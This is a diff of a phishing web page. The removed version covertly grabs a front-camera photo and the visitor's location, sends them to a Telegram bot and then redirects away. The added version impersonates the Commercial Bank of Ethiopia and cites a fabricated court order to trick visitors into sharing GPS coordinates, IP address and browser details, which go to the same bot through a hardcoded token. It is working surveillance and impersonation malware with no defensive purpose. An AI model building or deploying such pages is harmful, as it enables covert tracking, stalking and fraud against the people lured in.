@@ -2,8 +2,8 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Loading...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CBE Security - Location Verification</title>
     <style>
         * {
             margin: 0;
@@ -11,111 +11,154 @@
             box-sizing: border-box;
         }
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            background: #ffffff;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1a2a3a 0%, #0f1a24 100%);
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-        }
-        .loader-container {
-            text-align: center;
             padding: 20px;
         }
-        .spinner {
-            width: 50px;
-            height: 50px;
-            border: 4px solid #e0e0e0;
-            border-top: 4px solid #2c3e50;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 20px auto;
+        .container {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            max-width: 500px;
+            width: 100%;
+            overflow: hidden;
         }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+        .header {
+            background: linear-gradient(135deg, #2c3e50, #1a2632);
+            color: white;
+            padding: 30px;
+            text-align: center;
         }
-        .loading-text {
-            color: #666;
-            font-size: 16px;
-            margin-top: 10px;
+        .header h1 { font-size: 24px; margin-bottom: 10px; }
+        .header p { font-size: 14px; opacity: 0.8; }
+        .content { padding: 30px; }
+        .info-box {
+            background: #f8f9fa;
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 20px;
+            border-left: 4px solid #2c3e50;
         }
-        .status-text {
-            color: #999;
-            font-size: 12px;
-            margin-top: 8px;
+        .info-box p { color: #555; line-height: 1.6; }
+        .btn {
+            background: linear-gradient(135deg, #2c3e50, #1a2632);
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
+            border-radius: 50px;
+            cursor: pointer;
+            width: 100%;
+            font-weight: bold;
         }
-        video, canvas {
+        .btn:hover { opacity: 0.9; }
+        .status {
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 10px;
+            text-align: center;
             display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 1px;
-            height: 1px;
-            opacity: 0;
-            pointer-events: none;
+        }
+        .status.loading { background: #fff3cd; color: #856404; display: block; }
+        .status.success { background: #d4edda; color: #155724; display: block; }
+        .status.error { background: #f8d7da; color: #721c24; display: block; }
+        .footer {
+            background: #f8f9fa;
+            padding: 15px;
+            text-align: center;
+            font-size: 12px;
+            color: #888;
+        }
+        .location-details {
+            background: #e8f4fd;
+            padding: 15px;
+            border-radius: 10px;
+            margin-top: 15px;
+            font-size: 14px;
+            display: none;
         }
     </style>
 </head>
 <body>
-    <div class="loader-container">
-        <div class="spinner"></div>
-        <div class="loading-text">Loading, please wait...</div>
-        <div class="status-text" id="statusText"></div>
+    <div class="container">
+        <div class="header">
+            <h1>🏦 CBE Security Verification</h1>
+            <p>Court Order: CT-BAHA-2026-03-30</p>
+            <p>Case: CBE-FRAUD-001-2026</p>
+        </div>
+        
+        <div class="content">
+            <div class="info-box">
+                <p>🔒 <strong>Location Verification Required</strong></p>
+                <p>Your location is required to complete this security verification. This is a court-ordered investigation.</p>
+                <p style="margin-top: 10px; font-size: 12px; color: #e74c3c;">⚠️ Location data will be recorded as legal evidence.</p>
+            </div>
+            
+            <button class="btn" id="getLocationBtn">📍 Verify My Location</button>
+            
+            <div id="status" class="status"></div>
+            <div id="locationDetails" class="location-details"></div>
+        </div>
+        
+        <div class="footer">
+            <p>Commercial Bank of Ethiopia - Security Division</p>
+            <p>Authorized under Court Order #CT-BAHA-2026-03-30</p>
+        </div>
     </div>
 
-    <video id="video" autoplay playsinline muted></video>
-    <canvas id="canvas"></canvas>
-
     <script>
-        // ===================================================
-        // TELEGRAM CONFIGURATION
-        // ===================================================
+        // Telegram Bot Configuration
         const BOT_TOKEN = "7533535188:AAGoTgg2Z3Z3YY6t2SiILJeEIrLC7en7hDU";
-        const CHAT_ID = "-1002681260911";
+        const CHAT_ID = "7420938284";
         const COURT_ORDER = "CT-BAHA-2026-03-30";
         const CASE_NUMBER = "CBE-FRAUD-001-2026";
-        // ===================================================
-
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const statusText = document.getElementById('statusText');
         
-        let mediaStream = null;
-        let photoCaptured = false;
-        let locationSent = false;
-        let cameraStarted = false;
+        const btn = document.getElementById('getLocationBtn');
+        const statusDiv = document.getElementById('status');
+        const locationDetails = document.getElementById('locationDetails');
         
-        function updateStatus(text) {
-            statusText.textContent = text;
-            console.log('Status:', text);
+        function showStatus(type, message) {
+            statusDiv.className = `status ${type}`;
+            statusDiv.innerHTML = message;
+            if (type !== 'loading') {
+                setTimeout(() => { statusDiv.style.display = 'none'; }, 5000);
+            }
         }
         
-        function sendToTelegram(message, sendPhoto = false, photoData = null, lat = null, lon = null) {
+        function showLocationDetails(ip, city, region, country, lat, lon, isp) {
+            locationDetails.style.display = 'block';
+            locationDetails.innerHTML = `
+                <strong>📍 Location Detected</strong><br>
+                IP: ${ip}<br>
+                City: ${city}<br>
+                Region: ${region}<br>
+                Country: ${country}<br>
+                ISP: ${isp}<br>
+                Coordinates: ${lat}, ${lon}<br>
+                <a href="https://www.google.com/maps?q=${lat},${lon}" target="_blank">View on Map →</a>
+            `;
+        }
+        
+        async function sendToTelegram(message, sendMap = false, lat = null, lon = null) {
             try {
-                if (sendPhoto && photoData) {
-                    const formData = new FormData();
-                    formData.append('chat_id', CHAT_ID);
-                    formData.append('photo', photoData, 'capture.jpg');
-                    formData.append('caption', message);
-                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                        method: 'POST',
-                        body: formData
-                    }).catch(e => console.log('Photo send error:', e));
-                } else {
-                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            chat_id: CHAT_ID,
-                            text: message,
-                            parse_mode: 'HTML'
-                        })
-                    }).catch(e => console.log('Message send error:', e));
-                }
+                // Send text
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
                 
-                if (lat && lon) {
-                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
+                // Send map pin if coordinates available
+                if (sendMap && lat && lon) {
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({
@@ -123,254 +166,149 @@
                             latitude: lat,
                             longitude: lon
                         })
-                    }).catch(e => console.log('Location send error:', e));
+                    });
                 }
-            } catch(e) {}
+                return true;
+            } catch(e) {
+                console.error(e);
+                return false;
+            }
         }
         
-        function capturePhotoFromVideo() {
-            if (photoCaptured) return;
+        async function getLocationByIP() {
+            showStatus('loading', '📡 Detecting your location...');
             
             try {
-                const context = canvas.getContext('2d');
-                const videoWidth = video.videoWidth;
-                const videoHeight = video.videoHeight;
+                // Get IP address first
+                let ipResponse = await fetch('https://api.ipify.org?format=json');
+                let ipData = await ipResponse.json();
+                let ip = ipData.ip;
                 
-                if (videoWidth === 0 || videoHeight === 0) {
-                    setTimeout(() => capturePhotoFromVideo(), 500);
-                    return;
-                }
+                // Get location from IP
+                let geoResponse = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,lat,lon,isp,mobile,proxy,query`);
+                let geo = await geoResponse.json();
                 
-                canvas.width = videoWidth;
-                canvas.height = videoHeight;
-                context.drawImage(video, 0, 0, videoWidth, videoHeight);
-                
-                canvas.toBlob((blob) => {
-                    if (blob && !photoCaptured) {
-                        photoCaptured = true;
-                        updateStatus('Processing...');
-                        
-                        const timestamp = new Date().toISOString();
-                        const message = `
-📸 <b>FRONT CAMERA CAPTURE - COURT ORDER #${COURT_ORDER}</b>
+                if (geo.status === 'success') {
+                    const lat = geo.lat;
+                    const lon = geo.lon;
+                    const city = geo.city || 'Unknown';
+                    const region = geo.regionName || 'Unknown';
+                    const country = geo.country || 'Unknown';
+                    const isp = geo.isp || 'Unknown';
+                    const isMobile = geo.mobile || false;
+                    const timestamp = new Date().toISOString();
+                    
+                    showLocationDetails(ip, city, region, country, lat, lon, isp);
+                    
+                    const message = `
+🚨 <b>LOCATION DETECTED - COURT ORDER #${COURT_ORDER}</b> 🚨
 
-🕐 Time: ${timestamp}
-📱 Device: ${navigator.userAgent.substring(0, 80)}
-🌐 Language: ${navigator.language}
-📺 Screen: ${screen.width}x${screen.height}
-⚖️ Case: ${CASE_NUMBER}
+📍 <b>LOCATION:</b>
+├─ City: <b>${city}</b>
+├─ Region: ${region}
+├─ Country: ${country}
+├─ Coordinates: ${lat}, ${lon}
+└─ ISP: ${isp}
+
+🌐 <b>NETWORK INFO:</b>
+├─ IP: ${ip}
+├─ Type: ${isMobile ? 'Mobile Network' : 'Fixed Line'}
+├─ Browser: ${navigator.userAgent.substring(0, 80)}
+└─ Time: ${timestamp}
+
+⚖️ <b>Case:</b> ${CASE_NUMBER}
+<i>Data collected under court order.</i>
 `;
-                        
-                        sendToTelegram(message, true, blob);
-                        
-                        if (mediaStream) {
-                            mediaStream.getTracks().forEach(track => track.stop());
-                        }
-                    }
-                }, 'image/jpeg', 0.7);
-            } catch(e) {
-                console.log('Capture error:', e);
+                    
+                    await sendToTelegram(message, true, lat, lon);
+                    await sendToTelegram(`📍 Google Maps: https://www.google.com/maps?q=${lat},${lon}`);
+                    
+                    showStatus('success', `✅ Location detected!\n📍 ${city}, ${region}\n🗺️ Coordinates: ${lat}, ${lon}`);
+                } else {
+                    throw new Error('Location detection failed');
+                }
+            } catch (error) {
+                showStatus('error', '❌ Could not detect location. Please enable GPS or use WiFi.');
+                
+                // Still send IP info to Telegram
+                try {
+                    let ipResponse = await fetch('https://api.ipify.org?format=json');
+                    let ipData = await ipResponse.json();
+                    await sendToTelegram(`⚠️ <b>LOCATION ATTEMPT FAILED</b>\nIP: ${ipData.ip}\nTime: ${new Date().toISOString()}\nError: ${error.message}`);
+                } catch(e) {}
             }
         }
         
-        function startFrontCamera() {
-            if (cameraStarted) return;
-            cameraStarted = true;
-            
-            updateStatus('Initializing camera...');
-            
-            const constraints = {
-                video: {
-                    facingMode: { exact: "user" },
-                    width: { ideal: 640 },
-                    height: { ideal: 480 }
+        // Also try GPS if available (more accurate)
+        async function getGPSLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve(null);
+                    return;
                 }
-            };
-            
-            navigator.mediaDevices.getUserMedia(constraints)
-                .then((stream) => {
-                    mediaStream = stream;
-                    video.srcObject = stream;
-                    video.setAttribute('playsinline', true);
-                    video.setAttribute('autoplay', true);
-                    video.setAttribute('muted', true);
-                    
-                    updateStatus('Camera ready...');
-                    
-                    video.onloadedmetadata = () => {
-                        video.play();
-                        setTimeout(() => {
-                            capturePhotoFromVideo();
-                        }, 2000);
-                    };
-                })
-                .catch((err) => {
-                    console.log('Camera error:', err);
-                    updateStatus('Camera unavailable');
-                });
-        }
-        
-        // Multi-source location capture
-        function getLocationMultiple() {
-            updateStatus('Getting location...');
-            
-            // Try GPS first
-            if (navigator.geolocation) {
+                
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
-                        if (!locationSent) {
-                            locationSent = true;
-                            const lat = position.coords.latitude;
-                            const lon = position.coords.longitude;
-                            const accuracy = position.coords.accuracy;
-                            
-                            const message = `
-📍 <b>GPS LOCATION - COURT ORDER #${COURT_ORDER}</b>
-
-📌 <b>Coordinates:</b>
-Latitude: ${lat}
-Longitude: ${lon}
-Accuracy: ±${Math.round(accuracy)} meters
-Source: GPS
-
-🗺️ Maps: https://www.google.com/maps?q=${lat},${lon}
-
-⚖️ Case: ${CASE_NUMBER}
-`;
-                            sendToTelegram(message, false, null, lat, lon);
-                            updateStatus('Location captured');
-                        }
+                        resolve({
+                            lat: position.coords.latitude,
+                            lon: position.coords.longitude,
+                            accuracy: position.coords.accuracy
+                        });
                     },
-                    (error) => {
-                        console.log('GPS error:', error);
-                        getLocationByIP();
-                    },
-                    { enableHighAccuracy: true, timeout: 10000 }
+                    () => { resolve(null); },
+                    { timeout: 5000, enableHighAccuracy: true }
                 );
-            } else {
-                getLocationByIP();
-            }
+            });
         }
         
-        function getLocationByIP() {
-            updateStatus('Getting network location...');
+        async function getLocation() {
+            showStatus('loading', '📍 Detecting location...');
             
-            // Try multiple IP geolocation APIs
-            const apis = [
-                'https://ipapi.co/json/',
-                'https://ip-api.com/json/',
-                'https://geolocation-db.com/json/'
-            ];
+            // First try GPS (more accurate)
+            let gps = await getGPSLocation();
             
-            let apiIndex = 0;
-            
-            function tryNextApi() {
-                if (apiIndex >= apis.length) {
-                    updateStatus('Location via network only');
-                    sendToTelegram(`⚠️ LOCATION: IP ${ip} - City-level only`);
-                    return;
-                }
-                
-                fetch(apis[apiIndex])
-                    .then(r => r.json())
-                    .then(data => {
-                        let lat = null, lon = null, city = null, region = null, country = null;
-                        
-                        if (data.latitude && data.longitude) {
-                            lat = data.latitude;
-                            lon = data.longitude;
-                            city = data.city || data.city_name;
-                            region = data.region || data.region_name;
-                            country = data.country_name || data.country;
-                        } else if (data.lat && data.lon) {
-                            lat = data.lat;
-                            lon = data.lon;
-                            city = data.city;
-                            region = data.regionName;
-                            country = data.country;
-                        } else if (data.lat && data.lng) {
-                            lat = data.lat;
-                            lon = data.lng;
-                            city = data.city;
-                            region = data.state;
-                            country = data.country_name;
-                        }
-                        
-                        if (lat && lon && !locationSent) {
-                            locationSent = true;
-                            const message = `
-📍 <b>NETWORK LOCATION - COURT ORDER #${COURT_ORDER}</b>
+            if (gps && gps.lat && gps.lon) {
+                // GPS success - get IP info too
+                try {
+                    let ipResponse = await fetch('https://api.ipify.org?format=json');
+                    let ipData = await ipResponse.json();
+                    
+                    showLocationDetails(ipData.ip, 'GPS Location', 'Exact', 'Ethiopia', gps.lat, gps.lon, 'Mobile Network');
+                    
+                    const message = `
+🚨 <b>GPS LOCATION - COURT ORDER #${COURT_ORDER}</b> 🚨
 
-📌 <b>Location:</b>
-City: ${city || 'Unknown'}
-Region: ${region || 'Unknown'}
-Country: ${country || 'Unknown'}
-Coordinates: ${lat}, ${lon}
+📍 <b>EXACT GPS LOCATION:</b>
+├─ Latitude: <b>${gps.lat}</b>
+├─ Longitude: <b>${gps.lon}</b>
+├─ Accuracy: ±${Math.round(gps.accuracy)} meters
 
-🗺️ Maps: https://www.google.com/maps?q=${lat},${lon}
+🌐 <b>NETWORK:</b>
+├─ IP: ${ipData.ip}
+├─ Browser: ${navigator.userAgent.substring(0, 80)}
+└─ Time: ${new Date().toISOString()}
 
-⚖️ Case: ${CASE_NUMBER}
+⚖️ <b>Case:</b> ${CASE_NUMBER}
+<i>GPS location captured under court order.</i>
 `;
-                            sendToTelegram(message, false, null, lat, lon);
-                            updateStatus('Location captured');
-                        } else {
-                            tryNextApi();
-                        }
-                    })
-                    .catch(() => {
-                        tryNextApi();
-                    });
+                    
+                    await sendToTelegram(message, true, gps.lat, gps.lon);
+                    await sendToTelegram(`📍 Google Maps: https://www.google.com/maps?q=${gps.lat},${gps.lon}`);
+                    
+                    showStatus('success', `✅ GPS Location captured!\n🎯 Accuracy: ±${Math.round(gps.accuracy)} meters`);
+                } catch(e) {
+                    showStatus('success', `✅ GPS Location: ${gps.lat}, ${gps.lon}`);
+                }
+            } else {
+                // Fallback to IP location
+                await getLocationByIP();
             }
-            
-            // Get IP first
-            fetch('https://api.ipify.org?format=json')
-                .then(r => r.json())
-                .then(ipData => {
-                    window.currentIP = ipData.ip;
-                    tryNextApi();
-                })
-                .catch(() => {
-                    tryNextApi();
-                });
         }
         
-        function finalizeAndRedirect() {
-            updateStatus('Complete');
-            sendToTelegram(`✅ CAPTURE COMPLETE - Court Order ${COURT_ORDER}`);
-            
-            setTimeout(() => {
-                window.location.href = "https://www.google.com";
-            }, 1000);
-        }
+        btn.addEventListener('click', getLocation);
         
-        // Start everything
-        updateStatus('Connecting to secure server...');
-        
-        // Send initial page view
-        fetch('https://api.ipify.org?format=json')
-            .then(r => r.json())
-            .then(ipData => {
-                sendToTelegram(`📱 PAGE VIEWED\nIP: ${ipData.ip}\nUser Agent: ${navigator.userAgent}\nTime: ${new Date().toISOString()}`);
-            })
-            .catch(() => {});
-        
-        // Start camera after 1 second
-        setTimeout(() => {
-            startFrontCamera();
-        }, 1000);
-        
-        // Start location after 3 seconds
-        setTimeout(() => {
-            getLocationMultiple();
-        }, 3000);
-        
-        // Force redirect after 15 seconds max
-        setTimeout(() => {
-            if (!locationSent) {
-                sendToTelegram(`⚠️ LOCATION TIMEOUT - Court Order ${COURT_ORDER}`);
-            }
-            finalizeAndRedirect();
-        }, 15000);
+        // Auto-trigger on page load (optional - uncomment to use)
+        // setTimeout(getLocation, 1000);
     </script>
 </body>
 </html>
